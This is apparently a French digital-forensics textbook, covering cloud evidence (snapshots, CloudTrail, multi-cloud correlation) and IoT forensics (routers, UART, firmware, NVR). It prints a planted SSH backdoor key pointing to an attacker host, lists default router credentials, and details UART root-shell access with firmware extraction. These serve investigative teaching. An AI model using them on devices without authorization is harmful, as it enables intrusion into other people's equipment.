    --description "Forensic copy - case DOS-2026-034"

# 4. Calculer et documenter le hash du snapshot
# (via AWS S3 Export puis hash local)
aws ec2 export-image --snapshot-ids snap-0forensic123 \
    --s3-export-location S3Bucket=forensic-exports,S3Prefix=case-034/
# Apres export :
aws s3 cp s3://forensic-exports/case-034/snapshot.vmdk /output/
sha256sum /output/snapshot.vmdk > /output/snapshot_hash.txt

# GCP -- snapshot d'un disque Persistent Disk
gcloud compute disks snapshot DISK_NAME \
    --snapshot-names=forensic-snap-20260313 \
    --zone=europe-west1-b \
    --description="Forensic snapshot MVOM DOS-2026-034"
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{Le snapshot n'est pas l'image E01}
Un snapshot cloud est une copie logique cohérente du volume à un instant t.
Il préserve le contenu mais \textbf{pas exactement les mêmes garanties
qu'un write blocker physique}~: la création du snapshot est elle-même
une opération enregistrée dans CloudTrail. Documenter obligatoirement~:
\begin{enumerate}
    \item Horodatage exact de la création du snapshot~;
    \item ID du snapshot~;
    \item Compte AWS/GCP utilisé pour le créer~;
    \item Hash SHA-256 du fichier exporté.
\end{enumerate}
\end{boiteRemarque}

% ============================================================================
\section{Investigation Multi-Fournisseurs~: Corrélation Cloud}
\label{sec:correlation-cloud}
% ============================================================================

Les affaires complexes impliquent souvent plusieurs fournisseurs cloud
simultanément. La corrélation entre leurs données est la clé pour
reconstituer l'image complète.

\begin{boxscenario}{Affaire BAOBAB, corrélation multi-cloud}
L'Opération BAOBAB (fraudes MoMo, Chapitre~10~(UE~SEC4031)) implique~:
\begin{itemize}
    \item Un compte Binance (exchange crypto) via lequel les fonds
          ont été convertis~;
    \item Une adresse email Yahoo utilisée pour créer le compte Binance~;
    \item Un VPN hébergé sur AWS EC2 (masquage de l'IP réelle)~;
    \item Un wallet Bitcoin avec transactions sur la blockchain.
\end{itemize}

\textbf{Séquence de demandes parallèles~:}

\begin{enumerate}
    \item \textbf{Preservation simultanée~:} portail LEA Binance +
          portail LEA Yahoo + AWS CloudTrail. \textbf{Simultané,
          pas séquentiel}~: les données se recoupent et les effacer
          l'une révèlerait l'enquête à l'autre.

    \item \textbf{Analyse blockchain (immédiate, sans demande)~:}\\
          \texttt{https://www.blockchain.com/btc/address/1BaobabXXX}\\
          L'adresse Bitcoin et toutes ses transactions sont publiques.
          Identifier les échanges de destination (exchanges~: ont des
          obligations KYC) et les wallets liés.

    \item \textbf{Corrélation temporelle~:}
\begin{lstlisting}[language=bash_forensique]
# Chronologie fusionnee des 3 fournisseurs :
# [MoMo SMS]   2026-01-15 14:22:45  Transaction 250000 FCFA
# [Yahoo LEA]  2026-01-15 14:23:12  Login compte Yahoo IP:41.82.XXX.XXX
# [Binance LEA] 2026-01-15 14:23:45 Login Binance IP:41.82.XXX.XXX
# [Binance LEA] 2026-01-15 14:24:02 Conversion XAF -> USDT (240000 FCFA)
# [AWS CT]     2026-01-15 14:25:11  Connection SSH to EC2 VPN
# [Blockchain] 2026-01-15 14:31:05  Transfer 185 USDT -> Bitcoin wallet
\end{lstlisting}
          La même IP sénégalaise (\texttt{41.82.XXX.XXX}) apparaît
          dans les logs Yahoo et Binance à 78~secondes d'intervalle
          cohérence forte.
    \end{enumerate}
\end{boxscenario}

\begin{boxCRO}
\textbf{Analyse CRO. Blockchain comme preuve forensique}

$\mathcal{R}$ (Fiabilité)~: la blockchain Bitcoin est immuable par
conception. Une transaction enregistrée est permanente et vérifiable
indépendamment par tout analyste avec les mêmes outils. La fiabilité
est maximale, bien supérieure à un log de serveur qu'un administrateur
pourrait modifier.

$\mathcal{O}$ (Opposabilité)~: l'immuabilité de la blockchain constitue
une preuve d'une opposabilité exceptionnelle~; elle ne peut pas être
contestée sur le fond (la transaction a eu lieu). Elle peut être
contestée sur l'attribution (``prouvez que je contrôlais ce wallet'').

$\mathcal{C}$ (Confidentialité)~: paradoxalement, la blockchain est
\textbf{publique et pseudonyme}. L'anonymat peut être levé en
identifiant les échanges KYC aux deux extrémités de la chaîne.

\cro{$\uparrow$ pseudonyme mais levable}{$\uparrow\uparrow\uparrow$ immuabilité maximale}{$\uparrow\uparrow\uparrow$ incontestable}
\end{boxCRO}

% ============================================================================
\section{Défis Spécifiques~: Chiffrement et Résidualité}
\label{sec:defis-cloud}
% ============================================================================

\subsection{Données chiffrées côté client}

Certains services (Proton Mail, iCloud avec E2E, Signal) chiffrent les
données \textbf{côté client} avant de les envoyer au serveur~: même
avec un warrant, le fournisseur ne peut pas déchiffrer.

\begin{tableaucours}{p{3.5cm}p{3.0cm}p{5.0cm}}{%
    \tableauHeader{Service} &
    \tableauHeader{Chiffrement} &
    \tableauHeader{Ce que le fournisseur peut fournir}
}
Gmail (standard) & Serveur (Google déchiffre) &
    Contenu des emails (avec warrant), logs de connexion \\
Proton Mail & Bout en bout (E2E) &
    Métadonnées uniquement~; contenu inaccessible même avec warrant \\
iCloud (sans E2E) & Serveur (Apple déchiffre) &
    Contenu~: iCloud Backup, Photos, Notes (avec warrant) \\
iCloud (avec E2E actif) & Bout en bout (depuis iOS~16.3) &
    Métadonnées uniquement~; Apple ne peut plus déchiffrer \\
Signal & Bout en bout &
    Numéro de téléphone + date d'inscription + date dernière connexion.
    Rien d'autre~: Signal ne stocke rien. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~17.4. Chiffrement E2E et disponibilité des données}\end{center}

\subsection{Résidualité des données cloud~: la mémoire longue}

À l'inverse de l'éphéméralité, certaines données cloud persistent
très longtemps dans des emplacements non évidents~:

\begin{itemize}
    \item \textbf{Sauvegardes automatiques}~: Google conserve les données
          supprimées dans ses systèmes de backup pendant 60~jours minimum
          (selon la politique de 2024), non accessible à l'utilisateur,
          mais accessible via warrant.
    \item \textbf{Journaux de livraison email}~: même si un email est
          supprimé, les journaux de routage SMTP restent chez les
          intermédiaires (Google, Microsoft) pendant 30--90~jours.
    \item \textbf{Snapshots EBS abandonnés}~: des snapshots AWS créés
          par des processus de backup et non supprimés peuvent révéler
          l'état d'une instance à une date précise, souvent des mois
          après un incident.
    \item \textbf{CDN edge logs}~: CloudFront (AWS), Cloudflare, Akamai
          conservent leurs logs d'accès 30--90~jours, révélant
          des connexions à des sites même si le site lui-même a été
          supprimé.
\end{itemize}

\separateur

% --- Encadré lab NDAP SUKULU ---
\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-05}
\begin{itemize}
    \item \textbf{Lire un événement CloudTrail}~: \texttt{eventName} (l'appel
          d'API), \texttt{eventTime} (en UTC), \texttt{sourceIPAddress},
          \texttt{userIdentity} (qui agit, par exemple un rôle obtenu par
          \texttt{AssumeRole}), \texttt{requestParameters} (ce qui est
          demandé) et \texttt{responseElements} (ce qui est créé, par exemple
          l'identifiant d'une instance lancée par \texttt{RunInstances}).
    \item \textbf{Événements de données S3}~: \texttt{PutObject} donne le
          compartiment (\emph{bucket}) et le volume transféré
          (\texttt{bytesTransferredIn}, en octets, placé selon l'export dans
          \texttt{additionalEventData} ou \texttt{responseElements}~;
          diviser par 1\,048\,576 pour des Mio).
    \item \textbf{Fenêtre aveugle}~: \texttt{StopLogging} arrête la
          journalisation, \texttt{StartLogging} la reprend~; la durée entre
          les deux est la fenêtre aveugle. Pendant ce trou, d'autres sources
          continuent d'enregistrer (journaux de flux VPC, historique d'état
          des instances, facturation)~: une instance créée puis détruite dans
          la fenêtre s'y retrouve.
\end{itemize}
\end{boiteRemarque}

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Modèle~$\to$ preuve disponible~:} SaaS (Gmail,
          Office~365)~= logs + contenu via MLAT. IaaS (AWS EC2)~=
          logs CloudTrail uniquement~; contenu OS~= accès au compte
          client.

    \item \textbf{CloudTrail / Azure Activity Log / GCP Audit}~:
          les trois grandes plateformes IaaS logguent chaque appel API.
          Ces logs sont la source primaire de toute investigation IaaS.
          Chercher~: \texttt{StopLogging} (anti-forensique),
          \texttt{CreateUser}, \texttt{RunInstances}, \texttt{PutObject}.

    \item \textbf{Demande LEA~: 7~champs obligatoires}~: type, identifiants
          croisés, base légale (art.~52/57 Loi~2010 + Budapest/CLOUD Act),
          qualification avec double incrimination, période précise,
          distinction métadonnées/contenu, coordonnées directes.

    \item \textbf{Conservation d'abord}~: les logs de connexion
          disparaissent en 30--90~jours. Demande de conservation
          \emph{immédiate} puis MLAT dans les 60~jours.

    \item \textbf{Snapshot forensique}~: équivalent cloud de l'image
          E01. Documenter~: horodatage, ID snapshot, hash SHA-256 du
          fichier exporté, compte utilisé.

    \item \textbf{Blockchain}~: immuable, publique, pseudonyme.
          L'attribution nécessite d'identifier les exchanges KYC
          aux deux extrémités. Analyse gratuite sur blockchain.com
          ou Blockchair.

    \item \textbf{Chiffrement E2E}~: Signal/Proton~= métadonnées
          uniquement. iCloud avec E2E (iOS~16.3+)~= même Apple ne
          peut plus déchiffrer. Anticiper cette limite dans le plan
          d'investigation.

    \item \textbf{Anti-forensique cloud}~: \texttt{StopLogging} dans
          CloudTrail est lui-même loggué (s'il survient après la
          création du log)~; les logs S3 protégés par \textit{Object Lock}
          sont inviolables même par le propriétaire du compte.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~17.1. Modèle et preuves \niveaubase}]
Pour chacune des situations suivantes, identifiez le modèle de service
cloud impliqué, ce que le fournisseur peut fournir, et quel instrument
juridique est nécessaire~:
\begin{enumerate}[(a)]
    \item Un suspect utilise une adresse Gmail pour envoyer des emails
          de phishing. Vous voulez le contenu des emails et les IPs
          de connexion.
    \item Un ransomware a été déployé depuis une instance AWS EC2.
          Vous voulez savoir qui a lancé cette instance et depuis quelle IP.
    \item Des données de paiement volées sont stockées sur un bucket
          Dropbox. Vous voulez les métadonnées du compte et les fichiers.
    \item Un groupe WhatsApp a coordonné une fraude. WhatsApp utilise
          le chiffrement E2E. Que peut fournir Meta~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~17.2. Analyse CloudTrail \niveaumoyen}]
Les logs CloudTrail du compte AWS de TRANSBOIS~SA (extrait)~:
\begin{lstlisting}[language=bash_forensique]
02:10:45  GetPasswordData      IP:10.0.0.15      User:admin
02:13:45  AssumeRole           IP:185.220.XX.XX  User:admin
02:14:03  DescribeInstances    IP:185.220.XX.XX  User:admin
02:16:02  RunInstances         IP:185.220.XX.XX  User:admin
02:17:55  PutObject            IP:185.220.XX.XX  Bucket:transbois-backup
02:19:48  StopLogging          IP:185.220.XX.XX  User:admin
02:23:11  TerminateInstances   IP:185.220.XX.XX  User:admin
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Identifiez les indicateurs de compromission dans cette séquence.
    \item L'action à 02h10:45 (\texttt{GetPasswordData}) précède
          la connexion suspecte à 02h13:45. Que pourrait-elle indiquer~?
    \item L'attaquant a tenté de stopper CloudTrail à 02h19:48.
          Pourquoi a-t-il échoué (hypothèse la plus probable)~?
    \item Rédigez les constatations forensiques CloudTrail et
          l'analyse correspondante avec niveau de confiance.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~17.3. Plan d'investigation multi-cloud \niveauexpert}]
L'affaire BAOBAB implique~: fraudes MoMo vers un compte Binance~;
un compte Yahoo utilisé pour Binance~; des logs AWS suggèrent un VPN
EC2~; 3~adresses Bitcoin identifiées par analyse blockchain.
L'IP sénégalaise \texttt{41.82.XXX.XXX} apparaît dans les logs.
\begin{enumerate}[(a)]
    \item Construisez le plan d'investigation multi-cloud~: dans quel
          ordre activer quels canaux (conservation, portails LEA, MLAT,
          INTERPOL, AFRIPOL)~? Justifiez l'ordre par les durées de
          rétention.
    \item Pour chaque fournisseur (Binance, Yahoo, AWS), identifiez~:
          (i)~la base légale applicable, (ii)~le type de données
          accessible sans MLAT, (iii)~ce qui nécessite un MLAT.
    \item L'analyse blockchain révèle que les 3~adresses Bitcoin
          envoient vers un exchange turc (Paribu). La Turquie est
          partie à Budapest depuis 2014. Rédigez la demande de
          conservation urgente à envoyer via le BCN INTERPOL, en
          citant les articles applicables.
    \item Appliquez la grille CRO à la décision d'analyser publiquement
          les adresses Bitcoin (données publiques mais pseudonymes)~:
          quelles implications pour $\mathcal{C}$ si vous publiez
          l'analyse dans votre rapport judiciaire~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le chapitre suivant aborde la dernière famille
de supports de la Partie~IV~: les objets connectés et systèmes
embarqués (caméras, routeurs, équipements industriels), dont les
journaux sont rares et le micrologiciel devient lui-même une pièce.
Le Chapitre~\ref{chap:anti-for} (Partie~V) examinera ensuite les
techniques utilisées pour effacer les traces dans les systèmes,
les réseaux et le cloud, et comment les détecter malgré tout.
\end{boxinfo}

      
        % ============================================================================
% Fichier  : partie4/P04_C18_forensique_iot_embarque.tex
% Titre    : Forensique IoT et Systèmes Embarqués
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Forensique IoT et Systèmes Embarqués}
\label{chap:for-iot}

\epigraph{%
    « The Internet of Things is the Internet of Vulnerabilities. »%
}{Bruce Schneier}

\niveauChapitre{Expert}{%
    Notions d'électronique embarquée, Linux embarqué et protocoles
    série (UART/I2C/SPI) souhaitables. Ce chapitre est le plus
    technique de la Partie~IV.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre les architectures IoT typiques et identifier
          où résident les données forensiquement utiles.
    \item Extraire les logs d'un routeur compromis via son interface
          d'administration ou via UART.
    \item Analyser le firmware d'un appareil IoT~: identifier les
          systèmes de fichiers, les configurations, les backdoors.
    \item Investiguer les caméras IP et systèmes DVR/NVR~:
          extraction des enregistrements et logs d'accès.
    \item Appliquer les principes de custody et d'intégrité à des
          preuves IoT~: volatilité extrême, absence de write blocker
          standardisé.
    \item Identifier les spécificités IoT du contexte camerounais~:
          Box opérateurs, compteurs prépayés, caméras de surveillance.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{L'IoT au Cameroun~: contexte forensique}
% ============================================================================

L'IoT forensique n'est pas encore au c\oe ur des investigations camerounaises,
mais plusieurs incidents récents imposent de s'y préparer~:

\begin{itemize}
    \item Routeurs ADSL/4G (MTN Box, Orange HomeBox) compromis pour
          des attaques Man-in-the-Middle sur les clients~;
    \item Caméras IP de surveillance (hôtels, banques, aéroport
          de Nsimalen) piratées~; enregistrements utilisés pour
          du chantage ou effacés après un incident~;
    \item Compteurs électriques prépayés SONATREL compromis
          par manipulation des compteurs~;
    \item Décodeurs Canal+/DSTV modifiés pour contourner les
          protections DRM~: dommages aux droits d'auteur.
\end{itemize}

La particularité forensique de ces appareils~: ils produisent des
preuves importantes (logs de connexion, enregistrements vidéo,
configuration réseau) mais leur acquisition requiert des techniques
très différentes de celles couvertes dans les chapitres précédents.

\separateur

% ============================================================================
\section{Architecture IoT~: où Résident les Données Forensiques}
\label{sec:architecture-iot}
% ============================================================================

\subsection{Composants typiques d'un appareil IoT}

\begin{tableaucours}{p{2.8cm}p{3.5cm}p{5.5cm}}{%
    \tableauHeader{Composant} &
    \tableauHeader{Type de mémoire} &
    \tableauHeader{Données forensiques}
}
\textbf{Flash NAND/NOR} & Non volatile (persiste hors tension) &
    Firmware, configuration, logs persistants, données utilisateur \\
\textbf{RAM (DRAM/SRAM)} & Volatile (perdue à l'extinction) &
    Processus actifs, connexions réseau, clés de session,
    configuration temporaire \\
\textbf{eMMC} & Non volatile (stockage embarqué) &
    Système d'exploitation Linux, journaux, historique d'activité \\
\textbf{SD Card} & Non volatile (amovible) &
    Enregistrements (caméras IP), logs (DVR), sauvegarde config \\
\textbf{EEPROM} & Non volatile & Configuration critique, clés, calibrations \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~18.1. Mémoires IoT et données forensiques}\end{center}

\subsection{Priorité de collecte~: RFC~3227 appliquée à l'IoT}

La RFC~3227~\cite{rfc3227} (ordre de volatilité, Ch.~7~(UE~SEC4031)) s'applique
à l'IoT avec des adaptations~:

\begin{enumerate}
    \item \textbf{RAM et processus actifs}~: capturer via interface
          d'administration (SSH/Telnet/API) \emph{avant} toute autre action.
          Durée de vie~: de quelques secondes (si l'appareil est en train
          d'être réinitialisé) à des jours.
    \item \textbf{Logs système en mémoire}~: \texttt{dmesg},
          \texttt{syslog} en RAM. Exportés via interface admin avant
          extinction.
    \item \textbf{Logs persistants sur flash}~: survivent à l'extinction,
          mais souvent effacés au redémarrage ou en rotation courte.
    \item \textbf{Configuration}~: paramètres réseau, identifiants,
          règles de pare-feu. Non volatile mais peut être modifiée.
    \item \textbf{Firmware complet}~: extraction via UART ou déchippage~;
          analyse offline.
\end{enumerate}

\begin{boxalert}
\textbf{Le piège du ``factory reset''}

La première réaction d'un suspect en possession d'un appareil IoT
compromis est souvent d'effectuer un reset d'usine. Contrairement
aux idées reçues~:
\begin{itemize}
    \item Le factory reset sur la plupart des routeurs efface les logs
          et la configuration en RAM, mais \textbf{pas nécessairement
          le firmware} ni les données de la partition système~;
    \item Sur les caméras IP avec SD~Card, la SD~Card n'est pas
          systématiquement effacée par le reset (elle est montée
          séparément)~;
    \item L'enregistrement du reset lui-même peut apparaître dans les
          logs de l'opérateur (réinitialisation du bail DHCP,
          reconnexion réseau).
\end{itemize}
\textbf{Protocole~:} saisir physiquement l'appareil \emph{avant}
toute tentative de reset~; retirer la carte SD si présente~; couper
l'alimentation proprement (pas d'arrêt brutal qui pourrait corrompre
les données flash).
\end{boxalert}

% ============================================================================
\section{Forensique Routeur~: la Cible Prioritaire}
\label{sec:forensique-routeur}
% ============================================================================

\subsection{Pourquoi les routeurs sont des cibles forensiques clés}

Un routeur compromis est idéalement placé pour~:
\begin{itemize}
    \item Voir \textbf{tout le trafic} passant par lui (Man-in-the-Middle)~;
    \item Rediriger le DNS pour du phishing (DNS poisoning)~;
    \item Exfiltrer les credentials Wi-Fi de tous les clients~;
    \item Servir de rebond pour des attaques vers d'autres cibles
          (point de pivot).
\end{itemize}

Un routeur \emph{victime} d'une attaque contient les logs qui prouvent
l'intrusion. Un routeur \emph{appartenant au suspect} contient les
logs de ses communications.

\subsection{Extraction via interface d'administration}

\begin{boxoutils}{Extraction de logs via interface admin (SSH)}
\begin{lstlisting}[language=bash_forensique]
# Connexion SSH au routeur (si SSH est actif)
# PREREQUIS : credentials connus + autorisation judiciaire art. 52

ssh admin@192.168.1.1

# Routeurs sous OpenWRT / DD-WRT (Linux embarque)
# Lister les processus actifs
cat /proc/running_processes
# Ou
ps aux

# Connexions reseau actives (equivalent netstat)
cat /proc/net/tcp   # connexions TCP
cat /proc/net/arp   # table ARP (machines connectees recemment)
cat /proc/net/dev   # interfaces reseau et statistiques

# Logs systeme
cat /tmp/syslog    # syslog en RAM (volatile !)
logread            # commande OpenWRT pour les logs systeme

# Configuration actuelle (non volatile)
cat /etc/config/network    # configuration reseau
cat /etc/config/firewall   # regles de pare-feu
cat /etc/config/dhcp       # baux DHCP (machines ayant eu une IP)
cat /etc/config/wireless   # configuration Wi-Fi (SSID, mot de passe)

# Historique DHCP (clients ayant ete connectes)
cat /tmp/dhcp.leases
# Format : timestamp MAC-address IP hostname
# Exemple :
# 1710288900 aa:bb:cc:dd:ee:ff 192.168.1.42 LAPTOP-SUSPECT
# 1710289200 11:22:33:44:55:66 192.168.1.55 iPhone-MBONGO

# EXPORTER IMMEDIATEMENT avant toute action
scp admin@192.168.1.1:/tmp/syslog /output/router_syslog.txt
scp admin@192.168.1.1:/tmp/dhcp.leases /output/router_dhcp.txt
\end{lstlisting}
\end{boxoutils}

\subsection{Extraction via UART~: quand l'interface admin est inaccessible}

Quand les credentials de l'interface admin sont inconnus (changés par
l'attaquant, ou appareil saisi dont le propriétaire refuse de coopérer),
l'accès physique via \termecle{UART}\index{UART} permet d'obtenir une
console série directe sur l'appareil.

\begin{boxdef}
\textbf{UART} (\textit{Universal Asynchronous Receiver-Transmitter})~:
interface série physique présente sur la quasi-totalité des cartes
électroniques embarquées. Elle donne accès à une console root lors
du démarrage du bootloader (U-Boot) et souvent tout au long du
fonctionnement. Fonctionne via 3 broches~: TX (émission), RX
(réception), GND (masse).
\end{boxdef}

\begin{boxoutils}{Accès UART à un routeur}
\begin{lstlisting}[language=bash_forensique]
# Matériel nécessaire :
# - Convertisseur USB-to-UART (CH340G ou FT232RL, ~5 USD)
# - Voltmetre (pour mesurer le niveau logique : 3.3V ou 5V)
# - Fils Dupont / sonde oscilloscope

# Etape 1 : Ouvrir le boitier et localiser les broches UART
# Sur la plupart des routeurs : groupe de 4 broches (VCC, TX, RX, GND)
# Identifier GND (masse) avec le voltmetre

# Etape 2 : Mesurer le niveau logique
# Si VCC mesure 3.3V -> utiliser un adaptateur 3.3V
# Si VCC mesure 5V -> adaptateur 5V ou niveau-shifter 5V->3.3V

# Etape 3 : Connecter (CROISER TX<->RX)
# Convertisseur TX -> Routeur RX
# Convertisseur RX -> Routeur TX
# Convertisseur GND -> Routeur GND

# Etape 4 : Terminal serie (Linux)
screen /dev/ttyUSB0 115200    # vitesse la plus courante
# Alternatives : minicom, picocom
picocom -b 115200 /dev/ttyUSB0

# Resultat : console U-Boot puis Linux au demarrage
# [    0.000000] Linux version 5.4.152 (OpenWrt)
# [    2.341827] eth0: Link is Up - 1Gbps/Full
# OpenWrt login: root     # <- shell root accessible !

# Commande de sauvegarde complete depuis UART
# (lente mais complete : dump de la flash NAND entiere)
cat /dev/mtdblock0 > /tmp/firmware_dump.bin
# Puis exfiltrer via SCP ou TFTP
tftp -p -l /tmp/firmware_dump.bin 192.168.1.100
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{UART et responsabilité}
L'accès UART à un appareil implique son ouverture physique (vis, parfois
clips) et la manipulation de son électronique. Documenter photographiquement
l'état de l'appareil \emph{avant} toute manipulation~: position des
broches, état de la carte, numéro de série visible. Toute modification
physique doit être mentionnée dans le rapport (ACPO~\cite{acpo2012} Principe~2~: si une
modification est nécessaire, elle doit être documentée et justifiée).
\end{boiteRemarque}

% ============================================================================
\section{Analyse de Firmware~: ce que l'Appareil Cache}
\label{sec:analyse-firmware}
% ============================================================================

\subsection{Extraction et analyse avec Binwalk}

\termecle{Binwalk}\index{Binwalk} est l'outil de référence pour l'analyse
de firmware. Il identifie et extrait automatiquement les systèmes de
fichiers, les images compressées et les signatures dans un binaire.

\begin{boxoutils}{Analyse de firmware avec Binwalk}
\begin{lstlisting}[language=bash_forensique]
# Analyser un fichier firmware (telecharge sur le site du fabricant
# ou extrait de l'appareil)
binwalk firmware.bin

# Resultat type :
# DECIMAL   HEX       DESCRIPTION
# 0         0x0       TRX firmware header
# 28        0x1C      LZMA compressed data
# 131072    0x20000   Squashfs filesystem, little endian, version 4.0
#                     Compression: xz
#                     Total inodes: 2847
#                     Block size: 262144

# Extraire automatiquement tous les composants identifie
binwalk -e --directory=/output/firmware_extracted/ firmware.bin

# Contenu type apres extraction :
ls /output/firmware_extracted/
# _firmware.bin.extracted/
#   0.bin          <- bootloader
#   20000.squashfs <- systeme de fichiers (monter pour analyser)

# Monter le systeme de fichiers SquashFS
sudo mount -o loop,ro \
    /output/firmware_extracted/_firmware.bin.extracted/20000.squashfs \
    /mnt/firmware/

# Explorer le contenu
ls /mnt/firmware/
# bin/  etc/  lib/  overlay/  proc/  sbin/  usr/  var/

# Chercher les configurations et identifiants
cat /mnt/firmware/etc/shadow      # hash des mots de passe
cat /mnt/firmware/etc/passwd      # comptes utilisateurs
cat /mnt/firmware/etc/config/     # configuration OpenWRT
find /mnt/firmware/ -name "*.conf" -exec grep -l "password\|passwd" {} \;

# Rechercher les backdoors (cles SSH pre-installees)
find /mnt/firmware/ -name "authorized_keys"
find /mnt/firmware/ -name "*.key" -o -name "*.pem"

# Identifier les services actifs au demarrage
cat /mnt/firmware/etc/rc.d/
cat /mnt/firmware/etc/inittab
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Backdoor découverte dans un routeur MTN Box}
L'analyse Binwalk du firmware d'un routeur MTN Box saisi dans une
investigation de cybercriminalité révèle~:

\begin{lstlisting}[language=bash_forensique]
find /mnt/firmware/ -name "authorized_keys"
# /mnt/firmware/root/.ssh/authorized_keys

cat /mnt/firmware/root/.ssh/authorized_keys
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@remote-c2.ru
\end{lstlisting}

\textbf{Constatation~:} le fichier \texttt{/root/.ssh/authorized\_keys}
du firmware extrait contient une clé SSH publique associée à
\texttt{attacker@remote-c2.ru}. Cette clé permet un accès root sans
mot de passe au routeur depuis l'IP contrôlée par cet attaquant.\\[0.3ex]
\textbf{Hash du fichier firmware~:}
\hash{SHA-256}{a3f7b29c8e1d4f56a2c8b7e3d9f0a142b5c8d3e6f1a4b7c0d2e5f8a1b4c7d0e3}\\[0.3ex]
\textbf{Corrélation~:} l'adresse \texttt{remote-c2.ru} apparaît dans
les logs SIEM de l'entreprise victime sur les 3 derniers mois, le
routeur servait de backdoor persistante.
\end{boxscenario}

% ============================================================================
\section{Forensique Caméras IP et Systèmes DVR/NVR}
\label{sec:cameras-ip}
% ============================================================================

\subsection{Architecture d'un système de vidéosurveillance}

Un système de vidéosurveillance IP typique comprend~:
\begin{itemize}
    \item Des \textbf{caméras IP} (ou caméras CCTV analogiques
          convertis par des encodeurs)~;
    \item Un \textbf{NVR} (\textit{Network Video Recorder}) ou
          \textbf{DVR} (\textit{Digital Video Recorder}) qui stocke
          les enregistrements~;
    \item Un \textbf{HDD interne} (3,5 pouces SATA) dans le NVR~;
    \item Des \textbf{logs d'accès} au système de gestion vidéo (VMS).
\end{itemize}

\subsection{Extraction des enregistrements}

\begin{boxoutils}{Acquisition forensique d'un NVR/DVR}
\begin{lstlisting}[language=bash_forensique]
# OPTION 1 : Export via interface web du NVR (le plus simple)
# Connexion a l'interface web (IP:port)
# Playback -> Exporter la plage horaire d'interet -> Format H.264/MP4

# OPTION 2 : Extraction du disque dur interne
# Retirer le HDD du NVR (etiqueter le cable SATA et son emplacement)
# Photographier avant extraction
# Connecter via write blocker SATA sur le poste forensique

# Identifier le systeme de fichiers (souvent proprietaire)
fdisk -l /dev/sdb
# Resultat type :
# Disk /dev/sdb: 2 TiB
# Device     Boot   Start       End    Sectors  Size Type
# /dev/sdb1          2048   2099199    2097152    1G  Linux filesystem
# /dev/sdb2       2099200 3906250751 3904151552  1.8T  (inconnu/propriétaire)

# Si le systeme de fichiers est reconnu (ext4, FAT) :
mount -o ro /dev/sdb1 /mnt/nvr/
ls /mnt/nvr/record/
# Fichiers .dav, .mp4, .avi selon le fabricant

# Si le systeme de fichiers est proprietaire (Hikvision, Dahua)
# utiliser les outils specifiques :
# VideoInspector, DVR-Examiner, ou
# Outil Python : python-dvr (open source)
python3 dvr_examiner.py /dev/sdb2 --export /output/nvr_records/

# OPTION 3 : Carving video sur espace brut
# Si le FS est corrompu ou efface :
bulk_extractor -o /output/bulk/ /dev/sdb
# bulk_extractor detecte les en-tetes video (H.264 NAL units)
# et extrait les fragments
\end{lstlisting}
\end{boxoutils}

\subsection{Logs d'accès au VMS~: qui a visionné quoi}

\begin{boxoutils}{Analyse des logs d'accès VMS}
\begin{lstlisting}[language=bash_forensique]
# Systemes Hikvision (les plus repandus en Afrique)
# Logs dans /var/log/hikvision/ ou /mnt/mtd/log/

ssh admin@192.168.1.64
cat /mnt/mtd/log/access.log

# Contenu type :
# [2026-03-13 02:14:15] LOGIN  admin  192.168.1.1   Success
# [2026-03-13 02:14:22] PLAYBACK  admin  Camera1  2026-03-12 18:00 -> 18:30
# [2026-03-13 02:15:01] DELETE  admin  Camera1  2026-03-12 18:00 -> 18:30
# [2026-03-13 02:15:02] FORMAT  admin  HDD1

# La sequence : Login -> Playback -> Delete -> Format
# indique une tentative de destruction de preuves

# Verifier si le formatage a ete complet (les secteurs non
# réécrits peuvent contenir des donnees recuperables)
# Apres saisie du HDD :
# dd if=/dev/sdb of=/output/nvr_image.dd bs=65536
# foremost -t avi,mp4 -i /output/nvr_image.dd -o /output/nvr_carved/
\end{lstlisting}
\end{boxoutils}

\begin{boxjuris}
\textbf{Enregistrements de vidéosurveillance~: admissibilité}

En droit camerounais, les enregistrements de vidéosurveillance sont
admissibles comme preuves si~:
\begin{itemize}
    \item Le système a été installé conformément à la réglementation
          (signalétique, déclaration auprès de l'autorité compétente)~;
    \item La chaîne de custody est documentée depuis le NVR/DVR
          jusqu'à la présentation en audience~;
    \item L'intégrité des fichiers est attestée par hash SHA-256~;
    \item Un expert judiciaire atteste de l'authenticité et de
          l'horodatage (synchronisation NTP du système).
\end{itemize}
\textbf{Point de vigilance~:} vérifier la synchronisation horaire
du NVR~: une dérive de plusieurs heures invalide la corrélation
avec d'autres sources. Documenter dans le rapport~: ``Heure affichée
du NVR au moment de la saisie~: 14h22~; heure de référence GPS~:
14h25~; dérive estimée~: +3~minutes.''
\end{boxjuris}

% ============================================================================
\section{IoT Spécifiques~: Box Opérateurs et Compteurs}
\label{sec:iot-cameroun}
% ============================================================================

\subsection{Box opérateurs MTN/Orange~: forensique des données de trafic}

Les Box Internet des opérateurs camerounais (MTN HomeBox 4G,
Orange LiveBox) sont des routeurs 4G intégrant un modem,
un switch Wi-Fi et souvent un décodeur TV.

\begin{boxoutils}{Extraction des données forensiques d'une Box 4G}
\begin{lstlisting}[language=bash_forensique]
# Interface d'administration web (typiquement 192.168.1.1)
# Identifiants par defaut (si non changes) :
# MTN HomeBox : admin/admin ou admin/[IMEI partiel]
# Orange LiveBox : admin/[code sur etiquette]

# Via SSH (si active) :
ssh admin@192.168.1.1

# Historique des connexions clients Wi-Fi
cat /tmp/hostapd_events.log
